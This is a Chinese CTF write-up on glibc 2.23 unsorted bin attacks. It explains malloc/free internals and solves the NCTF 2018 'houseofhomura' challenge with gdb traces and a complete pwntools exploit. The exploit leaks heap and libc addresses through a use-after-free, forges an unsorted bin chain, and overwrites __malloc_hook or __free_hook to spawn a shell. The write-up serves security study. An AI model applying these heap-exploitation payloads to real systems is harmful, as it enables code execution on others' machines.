# Unsorted bin

## malloc 
```
static void *
_int_malloc (mstate av, size_t bytes)       // mstate 为 main_arena 结构体 
{
	INTERNAL_SIZE_T nb;               /* normalized request size */
	unsigned int idx;                 /* associated bin index */
	mbinptr bin;                      /* associated bin */
	
	mchunkptr victim;                 /* inspected/selected chunk */
	INTERNAL_SIZE_T size;             /* its size */
	int victim_index;                 /* its bin index */
	
	mchunkptr remainder;              /* remainder from a split */
	unsigned long remainder_size;     /* its size */
	
	unsigned int block;               /* bit map traverser */
	unsigned int bit;                 /* bit map traverser */
	unsigned int map;                 /* current word of binmap */
	
	mchunkptr fwd;                    /* misc temp for linking */
	mchunkptr bck;                    /* misc temp for linking */
	
	// Covert request size to normalized request size
	checksed_request2size(bytes, nb);
	...
	
	for(;;)
	{
		int iters = 0;
		while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks(av))     // unsorted_chunk (av) 为 main arena + 88 即 main arena 中存储 unsorted bin fd bk 的地方
		{
			bck = victim->bk;               // victim 为将被从 unsorted bin 链上取下来的那一块
			size = chunksize(victim);
			mchunkptr next = chunk_at_offset (victim, size);
			
			...
			/ *  glibc2.27 add the check  glibc2.23 doesn't have this check
			if (__glibc_unlikely (bck->fd != victim)
				|| __glibc_unlikely (victim->fd != unsorted_chunks (av)))
			  malloc_printerr ("mallloc(): unsorted double linked list corrupted");
			if (__libc_unlikely (prev_inuse (next)))
			  malloc_printerr ("malloc(): invalid next->prev_inuse (unsorted)");
			*/
			
			// if a small request , try to ues last remainder if it is the only chunk in unosrted bin.
			if (in_samllbin_range (nb) && 
				bck == unsorted_chunks (av) &&
				victim == av->last_remainder &&
				(unsigned long) (size) > (unsigned long) (nb + MINSIZE))
			{...}
			
			/* remove from unsorted list */
			if (__glibc_unlikely (bck->fd != victim))
			  malloc_printerr("malloc(): corrupted unsorted chunks 3");
			unsorted_chunks (av)->bk = bck; 
			bck->fd = unsorted_chunks (av);
			
			/* Take now instead of binning if exact fit */
			
			// because size fits ,so after setting some values or checking some values, it returns p
			if (size == nb)
			{
				...
				return p;
			}
			
			/* place chunk in bin */
			
			if (in_samllbin_range (size))
			{
				victim_index = smallbin_index (size);
				bck = bin_at (av, victim_index);
				fwd = bck->fd;
			}
			else 
			{
				victim_index = largenbin_index(size);
				bck = bin_at (av, victim_index);
				fwd = bck->fd;
				
				/* maintain large bins in sorted order */
				if (fwd != bck)
				{...}
				else 
				{...}
				
			}
			
			mark_bin(av, victim_index);
			victim->bk = bck;
			victim->fd = fwd;
			fwd->bk = victim;
			bck->fd = victim;
			
#define MAX_ITERS         10000
			if (iters >= MAX_ITERS)
				break;
		}
		
		/*
			If a large request, scan through the chunks of current bin in
			sorted order to find smallest that fits.  Use the skip list for this.
		*/
		
		if (!in_smallbin_range(nb))
		{...}
		else 
		{...}
		
		...
		
		use top :
			...
		
		...
	}
	
}
```

上述代码中 // 注释的为笔者加的注释，/* */ 为代码中原生注释，英文写的 // 为笔者为便于理解 unsorted bin 的大框架简写了代码中原生注释 <br/>

在笔者看来，unsorted bin 中取下 victim 那一块时 ，victim 的 bk 可以称得上是 unsorted bin malloc 的发起点，相反 victim 的 fd 甚至基本毫无提及。在检测很少的 unsorted bin 的 malloc ，如果能修改 free 掉的 unsorted bin 的 bk，将 unsorted bin 的 bk 改成 目标地址-0x10，那么就能在 fake_bk+0x10 的地址上写上 (main arena+88) 的值，比如将 global_max_fast 的值改大，则之后的 chunk 的 malloc 和 free 皆变成了 fastbin 的 malloc 和 free，但是 unsorted bin 的机制基本可以说是废掉了，再使用便会 crash。<br/>

主流的两种 unsorted bin attack ，一种是更改 global_max_fast 另一种是 house of orange 中更改 _IO_list_all (这个我还没搞懂，留坑=.=) <br/>

学长说还有一种比较典型的 attack , house of roman 也是用的这个办法，略微看了一下，基本思想就是，能够将 main_arena+88 写入 `__malloc_hook` 然后进行更改后3个字节，触发 `malloc_printerr` 从而 getshell (留坑)<br/>

## free
```
__int_free (mstate av, mchunkptr p, int have_lock)
{
	INTERNAL_SIZE_T size;        /* its size */
	mfastbinptr *fb;             /* associated fastbin */
	mchunkptr nextchunk;         /* next contiguous chunk */
	INTERNAL_SIZE_T nextsize;    /* its size */
	int nextinuse;               /* true if nextchunk is used */
	INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */
	mchunkptr bck;               /* misc temp for linking */
	mchunkptr fwd;               /* misc temp for linking */
	
	...
	
	if (nextchunk != av->top)
	{
		...
		
		/*
		  Place the chunk in unsorted chunk list. Chunks are
		  not placed into regular bins until after they have
		  been given one chance to be used in malloc.
		*/
		
		bck = unsorted_chunks(av);
		fwd = bck->fd;
		if (__glibc_unlikely (fwd->bk != bck))
			malloc_printerr ("free(): corrupted unsorted chunks");
		p->fd = fwd;
		p->bk = bck;
		if (!in_smallbin_range(size))
		{
			p->fd_nextsize = NULL;
			p->bk_nextsize = NULL;
		}
		bck->fd = p;
		fwd->bk = p;
		
		...
	}
	
	...
	
}
```

unsorted bin 的 free 就朴实很多，跟正常的双向链表没什么区别。

## 2018 NCTF houseofhomura 

### 前言
这个题目是 glibc2.23 ，在 glibc2.23 中连 check(victim->bk->fd == victim) 都没，而每次将链表中 chunk 拿出来之后，是用 unsorted_bins(av)->bk 遍历整个双向链表，即使双向链表中 fd 除 unsorted_bins(av)->fd 以外都是错误的，如果 unsorted_bins(av)->bk 的 fd 是指向 main_arena+88 的位置的，遍历 unsorted bins 的双向链表时，victim->bk->fd 每次都是被动被赋值成 unsorted_bins(av)->fd ，因此一层一层遍历下来， fd 都会被赋值成相同的值<br/>

（虽然我还是想默默吐槽一下，NCTF 2018 这题官方 exp 写的毫无注解，但是还是很巧妙的，这一题 unsorted bin 的攻击方式，确实在 Google 中没有搜出来[搜到最后，再搜的时候，Google 一个版面都显示你全看过]，不得已最后去调试了一发官方 exp [最后感觉官方 exp 还是写复杂了，不过已经很良心了，一些比赛连 exp 都没]）<br/>

### 功能
#### add()
每一次 add() 都会产生三个 chunk <br/>
先 malloc(0x10) 用来管理之后 malloc 的两个 chunk <br/>
```
struct P
{
	char* name;
	char* message;
}
```
之后两个 chunk 限制大小，name 最大 malloc(0x10)，message 最小 malloc(0x80+0x10) <br/>

```
void add()
{
  struct P *v0; // rbx
  struct P *v1; // rbx
  signed int i; // [rsp+4h] [rbp-1Ch]
  int v3; // [rsp+8h] [rbp-18h]
  int v4; // [rsp+Ch] [rbp-14h]

  for ( i = 0; i <= 14 && Array[i]; ++i )
    ;
  if ( i <= 14 )
  {
    Array[i] = (struct P *)malloc(0x10uLL);
    v0 = Array[i];
    v0->name = (char *)malloc(0x10uLL);
    printf("length of your name:");
    v3 = Atoi();
    if ( v3 > 15 )
      v3 = 16;
    printf("your name:");
    Read(Array[i]->name, v3);
    printf("size of your message:", (unsigned int)v3);
    v4 = Atoi();
    if ( v4 <= 0x80 || v4 > 0xFFF )
      v4 = 0x80;
    v1 = Array[i];
    v1->message = (char *)malloc(v4 + 16);
    printf("please leave your message:");
    Read(Array[i]->message, v4);
    puts("Done!");
  }
  else
  {
    puts("full!");
  }
}
```

#### delete()
删除的时候，会清空 Arrray[v0]，但是没清空 struct P 中两个指针（UAF）
```
void delete()
{
  int v0; // [rsp+Ch] [rbp-4h]

  printf("index:");
  v0 = Atoi();
  if ( v0 >= 0 && v0 <= 14 )
  {
    free(Array[v0]->name);
    free(Array[v0]->message);
    free(Array[v0]);
    Array[v0] = 0LL;
    puts("Done!");
  }
  else
  {
    puts("invalid");
  }
}
```

#### modify()
漏洞就出在这里，唯一可以打印的地方，以及唯一可以修改的地方（其实不是唯一可以修改的地方）<br/>
可以想到，如果在 delete() 之前 modify() 了，那么该 struct P 指针就会被记录在 qword_2020E0 这个位置，又因为 delete 之后可以 UAF，所以能更改被 free 之后 message 那一块的值，同样因为 UAF，即将被 malloc 块的（不包含头的）前8个字节上面有值，即原来残留的 fd ，然后在 add 的时候，输入空（""）那么就能泄露 heap base 和 libc base ，一个通过 fastbin 的 fd 泄露，一个通过 unsorted bin 的 fd 泄露 libc <br/>

对于被 free 掉的 unsorted bin 可以更改 fd bk 形成 fake unsorted bin 链 <br/>
```
void modify()
{
  int v0; // [rsp+8h] [rbp-18h]
  int v1; // [rsp+Ch] [rbp-14h]

  printf("index:");
  v1 = Atoi();
  if ( v1 >= 0 && v1 <= 14 )
  {
    if ( Array[v1] )
      qword_2020E0 = Array[v1];
    if ( qword_2020E0 )
    {
      printf("size:");
      v0 = Atoi();
      if ( v0 > strlen(qword_2020E0->message) )
        v0 = 16;
      printf("Hello %s you can modify your message >", qword_2020E0->name);
      Read(qword_2020E0->message, v0);
      puts("Done!");
    }
  }
  else
  {
    puts("invalid");
  }
}
```

#### edit_len_0
modify 跟 edit_len_0 最大的区别就是，modify 根据 strlen(message) 再次输入，而 edit_len_0 可以在 len = 0 时，进行复写
```
void edit_len_0()
{
  int v0; // [rsp+Ch] [rbp-34h]
  char s; // [rsp+10h] [rbp-30h]
  __int64 v2; // [rsp+28h] [rbp-18h]
  unsigned __int64 v3; // [rsp+38h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( vuln_argv == 0xDEADBEEF )
  {
    vuln_argv = 0;
    printf("index:");
    v0 = Atoi();
    if ( v0 >= 0 && v0 <= 14 )
    {
      if ( Array[v0] )
        qword_2020E0 = Array[v0];
      if ( qword_2020E0 )
      {
        printf("modify your message>");
        memset(&s, 0, 0x28uLL);
        Read(&s, 8u);
        printf("Here you can modify once again!>", 8LL);
        Read((char *)&v2, 8u);
        memcpy(qword_2020E0->message, &s, 0x20uLL);
        puts("Done!");
      }
    }
    else
    {
      puts("invalid");
    }
  }
}
```

### 分析
#### leak heap & libc
add() 三次 chunk : 0x20 0x20 0xa0 | 0x20 0x20 0xa0 | 0x20 0x20 0xa0 然后 delete(1) delete(0) 再 add() 的时候，name = "" 通过 modify() 打印，泄露出 heap base <br/>
libc 则通过先 add() 一个大块，然后 delete() 之后，add() 小块，小块会切分大块 unsorted bin ，从而 leak libc
```
log.info("leak heap")
add(0x10, "A"*0xF, 0x80, "a"*0x20)  # 0
add(0x10, "B"*0xF, 0x80, "b"*0x20)  # 1
add(0x10, "C"*0xF, 0x80, "c"*0x20)  # 2
modify(0, 0x21, "a"*0x20)

delete(1)
delete(0)
add(0, "", 0, "")
heap_base = leak(0, 0, "") - 0xe0
success("heap", heap_base)
pause()

log.info("leak libc")
add(0x10, "D"*0xF, 0x80, "d"*0x20)  # 1
add(0x10, "E"*0xF, (0xa0+0x20+0xa0), "e"*0x20) # 3
add(0x10, "F"*0xF, 0x80, "f"*0x20)  # 4
delete(3)
add(0, "", 0, "")                   # 5
add(0, "", 0, "")                   # 6
libc.address = leak(5, 0, "") - 88 - 0x3c4b20
success("libc", libc.address)
pause()
```

#### 构造 fake unsorted bin 链
如果最后能把一个 P 中指向 message 的指针变成自己可控，岂不美哉。这一个利用手法实在太强了[到了 libc2.27 就等着死吧 orz <br/>

在官方的 exp 中通过设计，将一个正在使用的 name 的块，放入了unsorted bin 链中，然后通过 unsorted bin 的 sort 的机制，被放入了 small bins 中，一个 name 的 chunk 即将变成另一个 add() 中的 struct P 想想就激动 <br/>

想想需要满足些什么条件，最起码 bk 的链需要循环，fd 的链则不用，unsorted_bins(av)->bk 的 fd 必须是 main_arena+88 ，对于 unsorted_bins(av)->bk 必须指向需要构造链的最下面那个 chunk 。不妨将 unsorted_bins(av) 的|fd bk| 看成一个chunk, chunk A， unsorted bins 链中间一块看成 chunk B，unsorted_bins(av)->bk 看成 chunk C <br/>

目标：
```
unsorted bins A <=> B <=> C
A.bk == C 
C.bk == B
B.bk == A (main_arena+88)
C.fd == A (main_arena+88)
```
最难处理的地方在于，我们需要让 name 的那个 chunk 比 正规的 unsorted bins 先出去，否则 name 那个 chunk 会因为 unosrted bins 的机制不能被 sort 出去，那么 unsorted bins (av)->bk == fake (name chunk) ，但是在 unsorted bins 的 malloc 的时候，将 unsorted_bins (av)->bk 这个 chunk 的 bk 值改变，unsorted_bins (av) 的 bk 值也就能变了，所以 伪造一个 unsorted_bins (av)->bk 的假 bk 值。

exp :
```
main_arena = libc.address + 0x3c4b20
system = libc.sym['system']
__malloc_hook = libc.sym['__malloc_hook']
__free_hook = libc.sym['__free_hook']
#  one_gadget = libc.address + 0xf02a4 / 0xf1147  both can get shell
one_gadget = libc.address + 0xf1147

log.info("hijack unsorted bin")
delete(5)
modify(5, 0x20, p64(heap_base+0x20)*2)
add(0x10, "G"*0xF, 0x80, p64(main_arena+88)*4)
modify(0, 0x20, "\x90"*0x20)
delete(0)
add(0x10, p64(main_arena+88)+p64(heap_base+0x120), 0x80, p64(main_arena+88)*4)
```

##### gdb 调试
###### delete(5) & modify()
```
pwndbg> parseheap
addr                prev                size                 status              fd                bk                
0x55c846963000      0x0                 0x20                 Used                None              None
0x55c846963020      0x0                 0x20                 Used                None              None
0x55c846963040      0x0                 0xa0                 Used                None              None
0x55c8469630e0      0xa0                0x20                 Used                None              None
0x55c846963100      0x0                 0x20                 Used                None              None
0x55c846963120      0x0                 0xa0                 Used                None              None
0x55c8469631c0      0xa0                0x20                 Used                None              None
0x55c8469631e0      0x0                 0x20                 Used                None              None
0x55c846963200      0x0                 0xa0                 Used                None              None
0x55c8469632a0      0x0                 0x20                 Used                None              None
0x55c8469632c0      0x0                 0x20                 Used                None              None
0x55c8469632e0      0x0                 0xa0                 Used                None              None
0x55c846963380      0x0                 0x20                 Freed     0x55c8469633a0              None
0x55c8469633a0      0x0                 0x20                 Freed                0x0              None
0x55c8469633c0      0x0                 0xa0                 Freed     0x7fa141c14b78    0x7fa141c14b78
0x55c846963460      0xa0                0x20                 Used                None              None
0x55c846963480      0x0                 0x20                 Used                None              None
0x55c8469634a0      0x0                 0xa0                 Used                None              None

0x55c8469633c0      0x0                 0xa0                 Freed     0x55c846963020    0x55c846963020
```
###### add() & modify(0)
modify(0) 仅仅是为了让 0x2020E0 记录 Array[0]
```
pwndbg> p main_arena
$1 = {
  mutex = 0,
  flags = 0,
  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0},
  top = 0x55c846963540,
  last_remainder = 0x55c8469633c0,
  bins = {0x55c8469633c0, 0x55c846963020, 0x7fa141c14b88 <main_arena+104>, 0x7fa141c14b88 <main_arena+104>, 0x7fa141c14b98 <main_arena+120>, 0x7fa141c14b98 <main_arena+120>, 0x7fa141c14ba8 <main_arena+136>, 0x7fa141c14ba8 <main_arena+136>, 0x7fa141c14bb8 <main_arena+152>, 0x7fa141c14bb8 <main_arena+152>, 0x7fa141c14bc8 <main_arena+168>, 0x7fa141c14bc8 <main_arena+168>, 0x7fa141c14bd8 <main_arena+184>, 0x7fa141c14bd8 <main_arena+184>, 0x7fa141c14be8 <main_arena+200>...},
  binmap = {16777216, 0, 0, 0},
  next = 0x7fa141c14b20 <main_arena>,
  next_free = 0x0,
  attached_threads = 1,
  system_mem = 135168,
  max_system_mem = 135168
}

```

###### delete(0) & add(0x10, p64(main_arena+88)+p64(heap_base+0x120), 0x80, p64(main_arena+88)*4)
进行 unsorted bin bk 的循环闭合 <br/>
这个地方我没下断点下好，讲一下为什么到了这一步吧，在 add() 中， malloc(0x10) 之后 malloc(0x10) ，这个就是 heap_base + 0x20 即 上面讲的 chunk C <br/>
在遍历 unsorted bins 时，会先将 0x20 拿出来，再把 unsorted bins 拿出来
```
unsorted_bins(av)->bk = (0x20)
(0x20).fd = unsorted_bins(av) / main_arena+88
(0x20).bk = (0x120)
(0x120).bk = unsorted_bins(av) / main_arena+88
(0x120).fd = unsorted_bins(av) / main_arena+88
```
```
pwndbg> parseheap
addr                prev                size                 status              fd                bk                
0x55c846963000      0x0                 0x20                 Freed     0x55c846963020              None
0x55c846963020      0x0                 0x20                 Freed                0x0              None
0x55c846963040      0x0                 0xa0                 Used                None              None
0x55c8469630e0      0xa0                0x20                 Used                None              None
0x55c846963100      0x0                 0x20                 Used                None              None
0x55c846963120      0x0                 0xa0                 Freed     0x55c8469633c0    0x7fa141c14b78
```

神奇的现象发生了
```
pwndbg> heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x55c846963540 (size : 0x20ac0)
       last_remainder: 0x55c8469633c0 (size : 0xa0)
            unsortbin: 0x0
(0x020)  smallbin[ 0]: 0x55c846963020
```

开开心心

#### hijack
我试了两种，一种 hijack `__malloc_hook => one_gadget` 另外一种 `__free_hook => system`，都可行

##### exp1
```
#  one_gadget = libc.address + 0xf02a4 / 0xf1147  both can get shell
one_gadget = libc.address + 0xf1147


# exp 1 : hijack __malloc_hook => one_gadget
log.info("last step : hijack __malloc_hook => one_gadget")
add(0x10, "1"*0x10, 0x80, "1"*0x20)
delete(0)
add(0x10, p64(__malloc_hook)*2, 0x80, "get shell")
edit_len_0(6, p64(one_gadget), p64(one_gadget))
pause()

log.info("Get shell")
io.sendlineafter(">>", "1")
```

##### exp2 
```
# exp 2 : hijack __free_hook => system
log.info("last step : hijack __free_hook => system")
add(0x10, "1"*0x20, 0x80, "/bin/sh\x00")
delete(0)
add(0x10, "/bin/sh\x00" + p64(__free_hook), 0x80, "/bin/sh\x00")
edit_len_0(6, p64(system), p64(system))
pause()

log.info("Get shell")
delete(0)
```

### 完整 exp 
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import os
import sys

elfPath = "./homura"
libcPath = "./libc-2.23.so"
Addr = ""
Port = 0

context.log_level = "debug"
context.binary = elfPath

elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
        context.log_level = "info"
    else :
        io = remote(Addr, Port)
        context.log_level = "info"
    if libcPath:
        libc = ELF(libcPath)

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def add(lenth, name, size, message):
    io.sendlineafter(">>", "1")
    io.sendlineafter("name:", str(int(lenth)))
    if lenth != 0:
        io.sendlineafter("name:", name)
    io.sendlineafter("message:", str(int(size)))
    io.sendlineafter("message:", message)

def delete(idx):
    io.sendlineafter(">>", "2")
    io.sendlineafter("index:", str(idx))

def modify(idx, size, message):
    io.sendlineafter(">>", "3")
    io.sendlineafter("index:", str(idx))
    io.sendlineafter("size:", str(int(size)))
    if size != 0:
        io.sendlineafter(">", message)

def leak(idx, size, message):
    io.sendlineafter(">>", "3")
    io.sendlineafter("index:", str(idx))
    io.sendlineafter("size:", str(int(size)))
    io.recvuntil("\x20")
    value = u64(io.recvuntil("\x20", drop=True).ljust(8, "\x00"))
    if size != 0:
        io.sendlineafter(">", message)
    return value


def edit_len_0(idx, s, v2):
    io.sendlineafter(">>", "5")
    io.sendlineafter("index:", str(idx))
    io.sendlineafter("message>", s)
    io.sendlineafter("!>", v2)


if __name__ == "__main__":
    '''
    [*] Test case 5:
    pause()
    add(0x10, "A"*0xF, 0x80, "a"*0x20)
    vuln(0, "B"*0x7, "b"*0x1F)
    '''

    log.info("leak heap")
    add(0x10, "A"*0xF, 0x80, "a"*0x20)  # 0
    add(0x10, "B"*0xF, 0x80, "b"*0x20)  # 1
    add(0x10, "C"*0xF, 0x80, "c"*0x20)  # 2
    modify(0, 0x21, "a"*0x20)

    delete(1)
    delete(0)
    add(0, "", 0, "")
    heap_base = leak(0, 0, "") - 0xe0
    success("heap", heap_base)
    pause()

    log.info("leak libc")
    add(0x10, "D"*0xF, 0x80, "d"*0x20)  # 1
    add(0x10, "E"*0xF, (0xa0+0x20+0xa0), "e"*0x20) # 3
    add(0x10, "F"*0xF, 0x80, "f"*0x20)  # 4
    delete(3)
    add(0, "", 0, "")                   # 5
    add(0, "", 0, "")                   # 6
    libc.address = leak(5, 0, "") - 88 - 0x3c4b20
    success("libc", libc.address)
    pause()

    # log.info("hijack global_max_fast")
    # global_max_fast 0x7f6c5d5b87f8
    # libc 0x7f6c5d1f2000
    # global_max_fast = libc.address + 0x3c67f8
    # _IO_list_all = libc.sym['_IO_list_all']
    '''
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
    '''
    main_arena = libc.address + 0x3c4b20
    system = libc.sym['system']
    __malloc_hook = libc.sym['__malloc_hook']
    __free_hook = libc.sym['__free_hook']
    #  one_gadget = libc.address + 0xf02a4 / 0xf1147  both can get shell
    one_gadget = libc.address + 0xf1147

    log.info("hijack unsorted bin")
    delete(5)
    modify(5, 0x20, p64(heap_base+0x20)*2)
    add(0x10, "G"*0xF, 0x80, p64(main_arena+88)*4)
    modify(0, 0x20, "\x90"*0x20)
    delete(0)
    add(0x10, p64(main_arena+88)+p64(heap_base+0x120), 0x80, p64(main_arena+88)*4)

    '''
    # exp 1 : hijack __malloc_hook => one_gadget
    log.info("last step : hijack __malloc_hook => one_gadget")
    add(0x10, "1"*0x10, 0x80, "1"*0x20)
    delete(0)
    add(0x10, p64(__malloc_hook)*2, 0x80, "get shell")
    edit_len_0(6, p64(one_gadget), p64(one_gadget))
    pause()

    log.info("Get shell")
    io.sendlineafter(">>", "1")
    '''

    # exp 2 : hijack __free_hook => system
    log.info("last step : hijack __free_hook => system")
    add(0x10, "1"*0x20, 0x80, "/bin/sh\x00")
    delete(0)
    add(0x10, "/bin/sh\x00" + p64(__free_hook), 0x80, "/bin/sh\x00")
    edit_len_0(6, p64(system), p64(system))
    pause()

    log.info("Get shell")
    delete(0)

    io.interactive()
    io.close()
```


